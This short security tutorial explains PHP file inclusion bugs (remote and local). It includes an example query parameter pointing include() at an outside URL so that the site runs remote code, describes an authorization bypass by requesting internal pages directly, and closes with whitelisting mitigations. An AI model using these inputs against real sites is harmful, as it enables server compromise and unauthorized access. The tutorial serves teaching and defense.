# File Inclusion

Suppose you have the following website, `http://example.com/index.php?page=home`. Changing the query to `?page=test` gives you the following error embedded in the page:

```txt
Warning: include(test.php): failed to open stream: No such file or directory in - on line 26
```

This seems to be calling the `include()` function on the page you reference + `.php`.

Suppose you change it to `?page=http://demoseen.com/test`. Suddenly it's making a web request to it, and any code that's contained in that file is going to be executed by the site in question.

## How it works

Any time you're including code on the fly based on user input without _very_ strict whitelisting, you're likely to run into _File inclusion_ bugs.

In many cases, PHP (and other languages/frameworks) will be configured to not allow web requests from an `include()` and the like. When they're possible, you have __Remote File Inclusion (RFI)__, when they're not, you're looking at __Local File Inclusion (LFI)__.

## Authorization Bypass

Often, applications are written such that authorization checks happen in a different file than the actual logic.

So in our scenario, going to `?page=admin` might give you a login prompt for an admin area, but `?page=admin_users` might give you direct access to the user management component for instance.

## Mitigation

Safest way to handle this is not to have user input driven into `include()` and the like whatsoever. Otherwise, _whitelisting_ as strict as possible is essential.

In the case that neither of these is viable, then _removing directory separators_ may be the only route. This is not recommended, but will prevent URLs and directory traversal.
